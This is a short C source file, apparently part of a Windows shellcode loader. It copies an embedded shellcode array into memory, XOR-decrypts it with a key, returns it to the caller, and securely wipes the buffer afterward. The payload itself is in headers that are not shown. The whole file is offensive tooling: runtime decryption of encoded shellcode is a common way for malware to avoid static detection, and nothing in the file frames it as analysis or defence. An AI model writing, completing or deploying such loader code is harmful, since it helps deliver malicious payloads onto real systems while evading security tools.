#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "payload.h"
#include "shellcode.h"

static void ldr_xor_decrypt(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key[i % sizeof(key)];
}

unsigned char *ldr_extract_shellcode(size_t *out_len) {
    unsigned char *buf = (unsigned char *)malloc(sizeof(shellcode));
    if (!buf) return NULL;

    memcpy(buf, shellcode, sizeof(shellcode));
    ldr_xor_decrypt(buf, sizeof(shellcode));
    *out_len = sizeof(shellcode);
    return buf;
}

void ldr_wipe(unsigned char *buf, size_t len) {
    SecureZeroMemory(buf, len);
    free(buf);
}
